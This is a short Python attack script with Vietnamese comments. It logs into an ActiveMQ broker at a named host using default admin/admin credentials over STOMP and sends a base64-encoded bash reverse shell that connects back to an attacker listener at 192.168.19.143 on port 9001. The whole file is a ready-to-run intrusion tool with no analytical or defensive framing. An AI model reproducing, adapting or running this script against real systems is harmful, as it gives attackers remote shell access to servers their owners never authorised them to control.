import stomp
import base64

# Target ActiveMQ host và port (OpenWire STOMP)
target_host = 'ktxnptit.loclx.io'
target_port = 61613

# Reverse shell payload (ví dụ gửi về máy attacker)
cmd = 'bash -c "bash -i >& /dev/tcp/192.168.19.143/9001 0>&1"'
payload = "b64:" + base64.b64encode(cmd.encode()).decode()

# Kết nối tới broker và gửi payload
conn = stomp.Connection([(target_host, target_port)])
conn.connect('admin', 'admin', wait=True)
conn.send(body=payload, destination='/topic/evil')
conn.disconnect()

print("[+] Payload sent!")
